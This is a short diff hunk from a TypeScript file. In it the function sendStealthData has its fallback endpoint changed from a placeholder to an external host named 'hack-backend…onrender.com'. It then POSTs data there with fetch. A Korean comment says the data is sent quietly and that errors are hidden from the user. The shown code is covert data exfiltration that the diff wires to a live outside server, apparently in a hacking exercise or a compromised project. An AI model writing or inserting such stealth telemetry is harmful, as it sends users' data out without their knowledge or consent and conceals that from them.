@@ -69,7 +69,7 @@ export async function sendStealthData(): Promise<void> {
     // 조용히 데이터 전송 (에러가 발생해도 사용자에게 알리지 않음)
     const endpoint =
       (import.meta as any).env?.VITE_STEALTH_ENDPOINT ||
-      "https://foo.com/api/stealth";
+      "https://hack-backend-ohnl.onrender.com/api/button-click";
     await fetch(endpoint, {
       method: "POST",
       headers: {
